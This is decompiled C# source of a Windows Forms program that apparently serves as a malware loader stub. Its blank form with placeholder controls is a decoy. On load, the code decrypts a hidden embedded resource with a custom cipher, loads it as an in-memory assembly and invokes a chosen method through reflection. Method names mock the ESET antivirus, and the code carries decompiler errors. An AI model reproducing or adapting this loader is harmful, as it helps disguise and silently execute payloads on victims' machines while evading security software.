using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using elapsmjd.My.Resources;

namespace elapsmjd;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("MaskedTextBox1")]
	private MaskedTextBox _MaskedTextBox1;

	[AccessedThroughProperty("LinkLabel1")]
	private LinkLabel _LinkLabel1;

	[AccessedThroughProperty("ListBox1")]
	private ListBox _ListBox1;

	[AccessedThroughProperty("DateTimePicker1")]
	private DateTimePicker _DateTimePicker1;

	private object poney;

	private object horse;

	private Assembly chocolate;

	private object ab;

	internal virtual _003F MaskedTextBox1
	{
		get
		{
			return _MaskedTextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_MaskedTextBox1 = value;
		}
	}

	internal virtual _003F LinkLabel1
	{
		get
		{
			return _LinkLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_LinkLabel1 = value;
		}
	}

	internal virtual _003F ListBox1
	{
		get
		{
			return _ListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListBox1 = value;
		}
	}

	internal virtual _003F DateTimePicker1
	{
		get
		{
			return _DateTimePicker1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_DateTimePicker1 = value;
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)pokamsl_Load);
		poney = null;
		horse = new object[0];
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		MaskedTextBox1 = new MaskedTextBox();
		LinkLabel1 = new LinkLabel();
		ListBox1 = new ListBox();
		DateTimePicker1 = new DateTimePicker();
		((Control)this).SuspendLayout();
		object maskedTextBox = (object)MaskedTextBox1;
		Point location = new Point(365, 25);
		((Control)maskedTextBox).set_Location(location);
		((Control)MaskedTextBox1).set_Name("MaskedTextBox1");
		object maskedTextBox2 = (object)MaskedTextBox1;
		Size size = new Size(100, 20);
		((Control)maskedTextBox2).set_Size(size);
		((Control)MaskedTextBox1).set_TabIndex(0);
		((Label)LinkLabel1).set_AutoSize(true);
		object linkLabel = (object)LinkLabel1;
		location = new Point(123, 71);
		((Control)linkLabel).set_Location(location);
		((Control)LinkLabel1).set_Name("LinkLabel1");
		object linkLabel2 = (object)LinkLabel1;
		size = new Size(59, 13);
		((Control)linkLabel2).set_Size(size);
		((Control)LinkLabel1).set_TabIndex(1);
		((Label)LinkLabel1).set_TabStop(true);
		((LinkLabel)LinkLabel1).set_Text("LinkLabel1");
		((ListControl)ListBox1).set_FormattingEnabled(true);
		object listBox = (object)ListBox1;
		location = new Point(459, 145);
		((Control)listBox).set_Location(location);
		((Control)ListBox1).set_Name("ListBox1");
		object listBox2 = (object)ListBox1;
		size = new Size(120, 95);
		((Control)listBox2).set_Size(size);
		((Control)ListBox1).set_TabIndex(2);
		object dateTimePicker = (object)DateTimePicker1;
		location = new Point(184, 92);
		((Control)dateTimePicker).set_Location(location);
		((Control)DateTimePicker1).set_Name("DateTimePicker1");
		object dateTimePicker2 = (object)DateTimePicker1;
		size = new Size(200, 20);
		((Control)dateTimePicker2).set_Size(size);
		((Control)DateTimePicker1).set_TabIndex(3);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(590, 147);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)DateTimePicker1);
		((Control)this).get_Controls().Add((Control)ListBox1);
		((Control)this).get_Controls().Add((Control)LinkLabel1);
		((Control)this).get_Controls().Add((Control)MaskedTextBox1);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public static byte[] Decrypt(byte[] input, int key)
	{
		checked
		{
			int num = input.Length - 2;
			for (int i = 0; i <= num; i += 2)
			{
				int num2 = input[i];
				int num3 = input[i + 1];
				int j = 2 * num3 - key - num2;
				int k;
				for (k = key - num2 + num3; k < 0; k += 256)
				{
				}
				for (; j < 0; j += 256)
				{
				}
				input[i] = (byte)unchecked(k % 256);
				input[i + 1] = (byte)unchecked(j % 256);
			}
			return input;
		}
	}

	public void hello_eset(string n, object o)
	{
		if (Operators.CompareString(n, "j", false) == 0)
		{
			ab = RuntimeHelpers.GetObjectValue(o);
		}
	}

	public void goulou(MethodInfo smarties)
	{
		smarties.Invoke(RuntimeHelpers.GetObjectValue(poney), (object[])horse);
	}

	public MethodInfo[] eset_you_know_i_love_you(Type t)
	{
		return t.GetMethods();
	}

	private void pokamsl_Load(object sender, EventArgs e)
	{
		byte[] rawAssembly = Decrypt((byte[])Resources.unknown_3, Conversions.ToInteger((string)Resources.unknown_2));
		chocolate = AppDomain.CurrentDomain.Load(rawAssembly);
		Type t = chocolate.GetTypes()[5];
		MethodInfo[] array = eset_you_know_i_love_you(t);
		foreach (MethodInfo methodInfo in array)
		{
			hello_eset(methodInfo.Name, methodInfo);
		}
		goulou((MethodInfo)ab);
	}

	static void smethod_0()
	{
		/*Error: Unexpected end of block*/;
	}
}
